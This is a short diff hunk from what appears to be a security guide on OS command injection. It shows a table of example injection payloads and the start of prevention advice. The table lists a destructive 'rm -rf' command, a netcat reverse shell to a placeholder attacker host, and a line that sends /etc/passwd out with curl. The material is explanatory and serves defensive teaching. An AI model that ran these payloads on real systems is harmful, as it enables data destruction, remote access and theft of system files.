@@ -332,6 +332,7 @@ ping 8.8.8.8; rm -rf /
 | **File Deletion**     | `; rm -rf /var/www`                 | Wipes critical data.           |                      |
 | **Reverse Shell**     | `; nc -e /bin/sh attacker.com 4444` | Grants remote terminal access. |                      |
 | **Data Exfiltration** | `; cat /etc/passwd                  | curl -X POST hacker.com`       | Steals system files. |
+
 ##### How to Prevent
 
 1. **Avoid OS Commands** : Use built-in libraries (e.g., Python’s `subprocess` with `shell=False`).
